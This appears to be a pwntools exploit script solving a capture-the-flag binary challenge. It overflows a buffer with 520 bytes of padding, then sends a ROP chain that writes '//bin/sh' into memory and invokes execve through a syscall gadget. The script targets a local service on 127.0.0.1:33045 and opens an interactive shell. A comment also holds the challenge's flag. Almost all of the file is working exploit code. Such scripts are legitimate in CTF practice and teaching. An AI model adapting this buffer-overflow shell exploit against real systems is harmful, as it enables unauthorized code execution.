from struct import pack
from pwn import *

def make_rop(): 
	IMAGE_BASE_0 = 0x0000000000400000 # 491fbb6abd0ce5299005082131227e1c4086daa68b59213a5311b10fdbd61b78
	rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

	rop = ''

	rop += rebase_0(0x000000000000304d) # 0x000000000040304d: pop r13; ret; 
	rop += '//bin/sh'
	rop += rebase_0(0x0000000000001e7b) # 0x0000000000401e7b: pop rbx; ret; 
	rop += rebase_0(0x00000000000a50e0)
	rop += rebase_0(0x0000000000059835) # 0x0000000000459835: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += rebase_0(0x000000000000304d) # 0x000000000040304d: pop r13; ret; 
	rop += p64(0x0000000000000000)
	rop += rebase_0(0x0000000000001e7b) # 0x0000000000401e7b: pop rbx; ret; 
	rop += rebase_0(0x00000000000a50e8)
	rop += rebase_0(0x0000000000059835) # 0x0000000000459835: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += p64(0xdeadbeefdeadbeef)
	rop += rebase_0(0x0000000000001716) # 0x0000000000401716: pop rdi; ret; 
	rop += rebase_0(0x00000000000a50e0)
	rop += rebase_0(0x0000000000003c9e) # 0x0000000000403c9e: pop rsi; ret; 
	rop += rebase_0(0x00000000000a50e8)
	rop += rebase_0(0x0000000000044a65) # 0x0000000000444a65: pop rdx; ret; 
	rop += rebase_0(0x00000000000a50e8)
	rop += rebase_0(0x000000000004541c) # 0x000000000044541c: pop rax; ret; 
	rop += p64(0x000000000000003b)
	rop += rebase_0(0x00000000000637f5) # 0x00000000004637f5: syscall; ret; 

	return rop

# Cup{d614239d431519b37796fe650f95c81821508601b1bb34ae5e2ad6fd3bc149f8}
if __name__ == "__main__":

	#p = process( "./case1" )
	p = remote( '127.0.0.1', 33045 )

	p.recvuntil( ": " )

	payload = 'a' * 520
	payload += make_rop()

	p.send( payload + '\n' )

	p.interactive()
